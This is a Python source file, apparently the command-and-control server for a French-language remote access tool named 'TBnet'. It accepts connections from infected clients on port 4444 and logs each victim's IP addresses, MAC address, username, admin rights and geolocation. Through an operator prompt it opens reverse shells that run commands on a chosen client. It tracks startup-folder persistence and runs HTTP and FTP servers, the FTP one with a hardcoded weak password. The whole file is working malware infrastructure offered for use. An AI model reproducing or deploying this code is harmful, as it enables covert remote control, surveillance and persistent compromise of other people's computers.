import socket
import threading
import time
import os
import signal
import ctypes
import inspect
import json
import http.server
import socketserver
import argparse
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib import servers
from pyftpdlib.handlers import FTPHandler
try:
    import logging
except:
    print("Erreur de l'importation de loggin essayer : pip install logging")

tid_clients = {}
pathDb = "./clients/"
extDb = ".json"

image = """ _______  ______                __
|_     _||   __ \.-----..-----.|  |_
  |   |  |   __ <|     ||  -__||   _|
  |___|  |______/|__|__||_____||____|
"""

### GESTION ARGUMENTS

print(image)
parser = argparse.ArgumentParser(description='TBnet Serveur Menu D\'aide :')
parser.add_argument('--host', 
                    type=str, 
                    required=False, 
                    dest='host',
                    default="0.0.0.0",
                    help='Ip d\'ecoute du seveur (defaut : Any)')
parser.add_argument('--port', 
                    type=int, 
                    required=False, 
                    dest='port',
                    default=4444,
                    help='Port découte du Serveur (defaut : 4444)')
parser.add_argument('--debug',
                    action='store_const',
                    const=True,
                    required=False,
                    dest='debug',
                    default=False,
                    help='Active le mode Debug du serveur')

args = parser.parse_args()

#########################

def _async_raise(tid, exctype):
    """raises the exception, performs cleanup if needed"""
    tid = ctypes.c_long(tid)
    if not inspect.isclass(exctype):
        exctype = type(exctype)
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
    if res == 0:
        raise ValueError("invalid thread id")
    elif res != 1:
        # """if it returns a number greater than one, you're in trouble,
        # and you should call it again with exc=NULL to revert the effect"""
        ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
        raise SystemError("PyThreadState_SetAsyncExc failed")

def StopAllClients():
    for tid in tid_clients:
        print(str(tid_clients[tid]))
        print(tid_clients)
        _async_raise(tid_clients[tid], SystemExit)


class Threads:

    thread_id = 0
    thread_name = "null"

    def StartThread(self, fonction, arg1 = "", arg2 = "" ,arg3 = ""):
        if "Run" in fonction:
            thread = threading.Thread(target=s.run, name=fonction)
            thread.start()

        if "StartHttp" in fonction:
            thread = threading.Thread(target=s.StartHttp, name=fonction)
            thread.start()

        if "StartFtp" in fonction:
            thread = threading.Thread(target=s.StartFtp, name=fonction)
            thread.start()

        if "Client" in fonction:
            thread = threading.Thread(target=s.Threaded_client, name=fonction, args=(arg1, arg2, arg3))
            thread.start()
            tid_clients[arg3] = thread.ident

        self.thread_id = thread.ident
        self.thread_name = thread.name
    
    def StopThread(self):
        print("Arret du Thread : " + self.thread_name + ", numéro : " + str(self.thread_id))
        _async_raise(self.thread_id, SystemExit)

def InscrireClient(client_num, platform, public_ip, local_ip, mac_address, architecture, device, username, administrator, geolocation, ipv4, persistance):
    client = {
    "client_num": client_num,
    "platform": platform,
    "public_ip": public_ip,
    "local_ip": local_ip,
    "mac_address": mac_address,
    "architecture": architecture,
    "device": device,
    "username": username,
    "administrator": administrator,
    "geolocation": geolocation,
    "ipv4": ipv4,
    "persistance": persistance
    }

    i = 1
    nom_fichier = "client"
    while nom_fichier == "client":
        if os.path.exists("client" + str(i) + extDb):
            print("le fichier existe")
        else:
            print("le fichier " + "client" + str(i) + " n'existe pas")
            nom_fichier = "client" + str(i)
        i = i + 1
    fichier = open(pathDb + nom_fichier + extDb, "w")
    fichier.write(json.dumps(client, indent=4))
    fichier.close

def LireClient(nom_fichier):
    fichier = open(pathDb + nom_fichier, "r")
    data = json.load(fichier)
    print(data)
    fichier.close

def TrouverMac(nom_fichier):
    fichier = open(pathDb + nom_fichier, "r")
    data = json.load(fichier)
    #print(data["mac_address"])
    fichier.close
    return data["mac_address"]

def DefinirIdConn(macAdress):
    fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "r")
    data = json.load(fichier)
    print(data["client_num"])
    fichier.close
    return data["client_num"]

def ReturnInfo(macAdress, info_name):
    fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "r")
    data = json.load(fichier)
    print(data[info_name])
    info = data[info_name]
    fichier.close
    return info

def DefinirPersistance(macAdress, value):
    fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "r")
    data = json.load(fichier)
    client_num = data["client_num"]
    platform = data["platform"]
    public_ip = data["public_ip"]
    local_ip = data["local_ip"]
    mac_address = data["mac_address"]
    architecture = data["architecture"]
    device = data["device"]
    username = data["username"]
    administrator = data["administrator"]
    geolocation = data["geolocation"]
    ipv4 = data["ipv4"]
    persistance = value
    client = {
    "client_num": client_num,
    "platform": platform,
    "public_ip": public_ip,
    "local_ip": local_ip,
    "mac_address": mac_address,
    "architecture": architecture,
    "device": device,
    "username": username,
    "administrator": administrator,
    "geolocation": geolocation,
    "ipv4": ipv4,
    "persistance": persistance
    }
    fichier.close()
    fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "w")
    fichier.write(json.dumps(client, indent=4))
    fichier.close()
    return True
        
def TestMacAddress(path,extension,macAddress):
    list_dir = []
    list_dir = os.listdir(path)
    count = 0
    for file in list_dir:
        if file.endswith(extension): # eg: '.txt'
            count += 1
            fileName, fileExtension = os.path.splitext(file)
            if TrouverMac(fileName + fileExtension) == macAddress:
                #print("l'adresse mac corespond")
                return True, fileName + fileExtension
    return False, "Null"

def CountClients(path):
    list_dir = []
    list_dir = os.listdir(path)
    count = 0
    for file in list_dir:
        if file.endswith(extDb): # eg: '.txt'
            count += 1
    return count

def AfficherClients(path): 
    list_dir = []
    list_dir = os.listdir(path)
    for file in list_dir:
        if file.endswith(extDb): # eg: '.txt'
            fileName, fileExtension = os.path.splitext(file)
            with open(pathDb + fileName + fileExtension, "r") as file:

                data = json.load(file)
                client_num = data["client_num"]
                platform = data["platform"]
                public_ip = data["public_ip"]
                local_ip = data["local_ip"]
                mac_address = data["mac_address"]
                architecture = data["architecture"]
                device = data["device"]
                username = data["username"]
                administrator = data["administrator"]
                geolocation = data["geolocation"]
                ipv4 = data["ipv4"]
                persistance = data["persistance"]
                file.close()
                print("\n\t\tListe clients :")
                print("\nNumero Client : %s\n\tPlatform : %s\
                \n\tPublic ip : %s\n\tLocal ip : %s\n\tMac address : %s\n\tArchitecture : %s\
                \n\tDevice : %s\n\tUsername : %s\n\tAdministrator : %s\n\tGeolocation : %s\
                \n\tIpv4 : %s\n\tPersistance : %s" \
                % (client_num, platform,public_ip, local_ip,mac_address, architecture,\
                device, username, administrator, geolocation, ipv4, persistance))

class Server:

    host = args.host
    port = args.port
    BUFFER_SIZE = 1024 * 128
    ThreadCount = 0
    current_sessions = 0
    SEPARATOR = "<sep>"
    stopClient = False
    local = True
    ordre = ""
    menu_help = "\thelp -- Afficher le Menu d'aide\n\tshell [numero du client]\
     -- Ouvrir un reverse shell sur un client. Exemple : shell 2\n"

    def run(self):
        ServerSocket = socket.socket()
        try:
            ServerSocket.bind((self.host, self.port))
        except socket.error as e:
            print(str(e))
        if self.host == "":
            addr = "0.0.0.0"
        else:
            addr = self.host
        print("Lancement du serveur sur : " + addr + " " + str(self.port))
        ServerSocket.listen(5)
        self.ThreadCount = CountClients(pathDb)
        while True:
            Client, address = ServerSocket.accept()
            print('Connected to: ' + address[0] + ':' + str(address[1]) + "\n")
            self.ThreadCount += 1
            self.LaunchThread("Client", Client, address ,self.ThreadCount)
            print('Thread Number: ' + str(self.ThreadCount))
            #print(Client.connect())
        ServerSocket.close()
        
    def Threaded_client(self, connection, address, id_conn):
        global ordre
        pwd = connection.recv(self.BUFFER_SIZE).decode('utf-8')
        print("[+] Current working directory:", pwd)
        infos = connection.recv(self.BUFFER_SIZE).decode('utf-8')
        platform, public_ip, local_ip, mac_address, architecture,\
         device, username, administrator, geolocation, ipv4  = infos.split(self.SEPARATOR)
        #id_conn = selon macaddresse
        print("\t Platforme : " + platform + "\n\t Ip Public : " + public_ip +\
        "\n\t Ip Local : " + local_ip + "\n\t Adresse Mac : " + mac_address +\
        "\n\t Architecture : " + architecture + "\n\t Device : " + device +\
        "\n\t Username : " + username + "\n\t Administrator : " +\
         administrator+ "\n\t Geolocation : " + geolocation+ "\n\t Ipv4 : " + ipv4)
        if TestMacAddress(pathDb, extDb, mac_address)[0] == False:
            print("Nouveau Client !")
            InscrireClient(id_conn, platform, public_ip, local_ip, mac_address, architecture,\
             device, username, administrator, geolocation, ipv4, "OFF")
        else:
            print("Client existe deja, num par defaut : " + str(id_conn))
            id_conn = DefinirIdConn(mac_address)
            print("Nouveau id : " + str(id_conn))
        exit = False
        while True:
        #print(str(connection.__getstate__))
            self.stopClient
            if self.stopClient:
                break
            if "shell" in self.ordre:
                if str(id_conn) in self.ordre:
                    self.current_sessions = id_conn
                    print("Ouverture d'un Reverse Shell sur la session : " + str(id_conn) + "\n")
                    while True:
                        if self.current_sessions == id_conn:
                            cmd = input(f"{str(id_conn)} : {pwd} $> ")
                            if cmd != "":
                                #print("pas egale a rien")
                                print(cmd)
                                if "exit" in cmd:
                                    self.local = True
                                    self.ordre = ""
                                    self.current_sessions = 0
                                    #print(str(self.local) + str(self.current_sessions) + self.ordre)
                                    #print("Fermeture de la session : " + str(id_conn))
                                    break
                                else:
                                    try:
                                        connection.sendall(str.encode(cmd))
                                    except socket.error as e:
                                        print(str(e))
                                        self.local = True
                                        self.ordre = ""
                                        self.current_sessions = 0
                                        exit = True
                                        break
                                    try:
                                        output = connection.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
                                    except socket.error as e:
                                        print(str(e))
                                        self.local = True
                                        self.ordre = ""
                                        self.current_sessions = 0
                                        exit = True
                                        break
                                    try:
                                        results, pwd = output.split(self.SEPARATOR)
                                    except:
                                        results = "Les Données recu sont surrement trop grosse"
                                    if "Persistance via dossier startup activé" in results:
                                        print("Persistance correctement activé")
                                        DefinirPersistance(mac_address, "ON")
                                    if "Persistance via dossier startup déja activé" in results and ReturnInfo(mac_address, "persistance"):
                                        print("Persistance deja activer mise a jour du fichier client")
                                        DefinirPersistance(mac_address, "ON")
                                    print(results)
                            #else:
                                ##print("egale a rien")
            if exit:
                break

    def Prompt(self):
        while True:
            if self.local == True:
                if self.current_sessions == 0:  
                    lcmd = input("TBnet => ")
                    #print(lcmd + " local")
                    self.ordre = lcmd
                    #print(self.ordre)
                    if "help" in lcmd:
                        print(self.menu_help)
                    if "exit" in lcmd:
                        self.stopClient = True
                        break
                    if "clients" in lcmd:
                        AfficherClients(pathDb)
                    lcmd = ""
                    if "shell" in lcmd:
                        self.ordre = ""
                        lcmd = ""
                        self.local = False
            time.sleep(0.1)

    def StartHttp(self):
        ADDR = self.host
        PORT = (self.port + 1)
        #print(ADDR +" " + str(PORT))
        DIRECTORY = "./http/"
        if not os.path.exists("./http/"):
            os.makedirs("./http/")

        class Handler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=DIRECTORY, **kwargs)
            def log_message(self, format, *args):
                pass

        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            print("Port d'écoute web : ", PORT)
            httpd.serve_forever()

    def StartFtp(self):
        ADDR = self.host
        PORT = (self.port + 2)
        DIRECTORY = "./ftp"
        authorizer = DummyAuthorizer()
        authorizer.add_user("user", "12345", DIRECTORY,  perm="elradfmw")
        address = (ADDR, PORT)  # listen on every IP on my machine on port 21
        handler = FTPHandler
        handler.authorizer = authorizer
        logging.basicConfig(filename='pyftpd.log', level=logging.INFO)
        server = servers.FTPServer(address, handler)
        print("Port d'écoute FTP : ", PORT)
        server.serve_forever()


    def LaunchThread(self, fonction, arg1 = "", arg2 = "", arg3 = ""):
        #print(fonction)
        t = Threads()
        t.StartThread(fonction, arg1, arg2 ,arg3)
        return t

    def ResetDb(self):
        pathDb = "test"
        
        
if os.path.exists(pathDb) != True:
    os.makedirs(pathDb)

s = Server()

listen_service = s.LaunchThread("Run")
http_service = s.LaunchThread("StartHttp")
ftp_service = s.LaunchThread("StartFtp")
time.sleep(1)
s.Prompt()
listen_service.StopThread()
http_service.StopThread()
ftp_service.StopThread()
#StopAllClients()
#p.StopThread()
os._exit(0)

